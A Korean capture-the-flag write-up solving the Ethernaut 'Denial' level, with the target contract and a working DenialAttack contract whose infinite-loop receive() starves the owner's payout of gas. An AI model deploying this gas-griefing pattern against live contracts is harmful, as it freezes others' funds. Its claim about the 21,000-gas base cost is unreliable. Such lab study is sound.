https://teberr.notion.site/Ethernaut-Denial-ceb57eb1f3514d8a8b69c324099cd13b

![Denial.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/45845a80-f5aa-426c-8d18-fed47b51e939/Denial.png)

> partner와 owner가 함께 1%씩 자산을 나눠 갖는 컨트랙트를 발견했습니다.

owner가 withdraw()함수를 호출하여 1%의 자산을 나눠가지려고 할 때 자산을 가져가지 못하게 해주세요. (컨트랙트에 자산은 여전히 존재하고 이 트랜잭션을 위한 가스비는 1백만 미만입니다.)
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

# 코드 분석 및 공격 설계

이 문제 컨트랙트에서는 핵심 함수가 딱 두가지가 존재한다. 파트너가 될 수 있는 setWithdrawPartner, 컨트랙트에 있는 자산을 파트너와 owner가 1%씩 나눠갖는 withdraw()함수이다.

```solidity
    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }
```

파트너가 될 수 있는 setWithdrawPartner 함수는 public으로 아무나 호출할 수 있어 파트너는 내가 원하는 주소로 설정해 줄 수 있다.

```solidity
    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }
```

withdraw 함수는 먼저 파트너에게 이 컨트랙트에 있는 자산의 1%를 call함수를 이용하여 전송하고 그 이후 owner에게 transfer 함수를 이용하여 이 컨트랙트에 있는 자산의 1%를 전송한다.

이 때 이더를 전송하는 함수로 파트너에게는 call을 owner에게는 transfer를 사용하였는데 이 둘의 차이점은 가스의 양이다.

### 이더를 전송하는 함수 Send, Transfer, Gas

1. send : 2300 gas를 전달, 성공여부를 true 또는 false로 리턴
2. transfer : 2300 gas를 전달, 실패시 에러를 발생
3. call : 가변적인 gas 전달 (gas값 지정 가능), 성공여부를 true 또는 false로 리턴
             재진입(reentrancy) 공격 위험성 있음 

transfer는 트랜잭션을 발생시키며 상대 컨트랙트가 이더를 받은 후 내부 연산을 할 수 있도록 2300 gas를 전달하게 된다.

call 함수는 트랜잭션을 발생시키며 상대 컨트랙트가 이더를 받은 후 내부 연산을 할 수 있도록 현재 트랜잭션을 위한 가스 중 63/64를 전달한다.

즉 transfer함수는 call{value: xxx, gas:2300)(””)와 같다고 이해하면 된다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ba08cb72-a98a-43e4-9b2a-8aeec49a807a/Untitled.png)

참고로 트랜잭션에 드는 가스비는 총 21000 가스가 소모된다. 

다시 문제로 돌아가서 문제에서는 withdraw()함수를 위하여 백만 가스를 소비한다고 되어있다. 즉 트랜잭션을 위하여 백만 가스를 사용한다는 것은 call 함수로 전달되는 가스는 1,000,000 * 63/64 이다.

![계산.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/579aac14-999b-47c2-8ae0-79a066eeb414/%EA%B3%84%EC%82%B0.png)

즉 이 가스를 전부 소비하고 나면 transfer 함수가 실행되어야 하는 때에는 15,625 가스만 남게 된다. 이는 트랜잭션을 발생시키기 위한 21000가스보다 부족하므로 owner에게 이더를 전송하는 트랜잭션이 정상적으로 실행되지 않는다. 

따라서 이 문제의 목적은 partner에게 이더를 전송하였을 때 내부 로직에서 전달 받은 가스를 전부 소모시켜 이후 owner에게 transfer가 실행되지 않도록 하는 것이다.

따라서 이더를 받으면 가스를 전부 소모하는 컨트랙트를 작성하자. 가스를 전부 소모시키는 방법은 두가지다. 

1. assert(false)를 이용하는 방법이다. assert는 조건문이 거짓일 시 가스를 전부 소모하고 에러를 전달하는 함수이므로 가스를 전부 소모시킬 수 있다.
2. 무한 반복문을 이용하는 방법이다. 가스값을 다 사용할 때 까지 계속해서 가스가 소모되므로 가스를 전부 소모시킬 수 있다.

이 에러들은 내부 트랜잭션(internal Transaction)이므로 에러가 발생하더라도 원본 트랜잭션을 취소시키지 않는다.

- Internal Transaction의 특징
    - Normal Tx가 성공했다고 해서 모든 internal tx가 성공하는 것은 아니다. (특정 internal tx 실패 시, 해당 서브트리의 internal tx 모두 실패)
    - Internal Tx의 gas는 tx에 종속된다.
    - on-chain 상에 기록되지 않기 때문에, geth, parity 등의 이더리움 클라이언트 API를 사용해야 한다.
    - Internal Tx를 통해 이더 전송, function call, contract creation 등이 가능하다. (주체가 EOA일 뿐이다)
    - Normal Tx에 종속돼서 일어난다. (parent hash가 존재)

# 공격

이더를 받았을 때 가스를 전부 소모하는 방법으로 무한 반복문을 채택하였다.

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

interface IDenial{
    function withdraw() external;
    function setWithdrawPartner(address) external;
}
contract DenialAttack{
    IDenial target;
    constructor(address _target)public{
        target=IDenial(_target);
    }
    function attack() public{
        target.withdraw();
    }
    function state()public{
        target.setWithdrawPartner(address(this));
    }
    receive() external payable{
        while(true){
            }

    }
}
```

state함수를 실행하여 partner를 내가 작성한 공격 컨트랙트의 주소로 설정해주자.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2ef69126-e2a3-40ab-b986-025f7a26e3bd/Untitled.png)

```solidity
await contract.partner()
'0xE0BFB13cB4b533cb0ddbFD80c43A5ec3878Aa4a9'
```

이제 내 공격 컨트랙트가 partner가 되었으므로 withdraw를 실행하면 내 공격 컨트랙트로 이더가 전송되어 recieve()함수가 실행된다. 가스를 전부 소모하게 무한 반복문으로 작성하였으므로 가스가 소모될 것이다. 

attack()을 통해 withdraw()함수를 호출하자. attack()함수를 진행할 때는 메타마스크에서 가스값을 1백만 미만으로 설정해주어야 한다. 안그러면 오류가 뜨지 않도록 적당한 값을 메타마스크에서 전달하기 때문에 테스트 공격에서 transfer가 실행이 되어버린다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96c7174a-d0e7-435f-9d2d-5f3187e58cf2/Untitled.png)

추천 사이트 버튼을 누르면 가스를 편집할 수 있다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/af43dea6-c934-4ccc-9c7f-ae4bdce19d82/Untitled.png)

여기서 고급을 눌러주자

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f23e7836-6fe5-4d75-a666-224b666ac4a9/Untitled.png)

가스한도가 3547390인 것을 확인할 수 있다. 우리는 가스한도가 백만이어야 하므로 이 값을 백만으로 편집해 준다.

![attack(4).PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4040a7dc-e29a-4cfd-9f27-78fcad2150d4/attack(4).png)

그런 다음 다음을 눌러서 공격을 진행해주면 된다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d3c2181e-be8b-410d-a65d-d71ee50803da/Untitled.png)

트랜잭션이 실패하였다고 뜬다. 의도한대로이므로 이를 이더스캔에서 확인해보자.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f2c3295c-577d-4946-bd6c-3f2278f1fa89/Untitled.png)

의도한 대로 내부 트랜잭션인 call과 transfer가 전부 실패한 것을 확인할 수 있다. 문제 목적을 달성하였으므로 이제 인스턴스를 제출하면 성공했음을 확인할 수 있다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/527f5530-591a-4699-ba56-af117a1ac21a/Untitled.png)

# 후기

이 단계에서는 알려지지 않은 컨트랙트를 호출하는 것은 가스가 고정값이 아닐 경우 DOS(서비스거부공격)공격 벡터가 될 수 있음을 알려준다.

만약 로우레벨 함수인 call을 사용할 때 외부 call이 revert난 이후로도 계속해서 실행이 지속되기를 원한다면 가스 값을 고정시켜서 호출해야 한다. 예를들어 call.gas(100000).value(). 처럼 가스를 고정시켜야한다.

전통적으로 checks-effects-interaction 패턴을 따라서 재진입 공격을 방어해야 하며 이와 같은 문제가 발생할 수 있는 여러 상황(함수 끝부분에서 여러개의 외부 호출 발생)이 있을 수 있다.

참고 : external call은 호출 할 때 사용 가능한 가스의 최대 63/64를 사용할 수 있다. 따라서 트랜잭션을 완료하는데 필요한 가스의 양에 따라 충분히 높은 가스의 트랜잭션이라면 나머지 1/64로 opcode 나머지를 전부 완료할 수 있게 되어 문제를 완화할 수 있다.
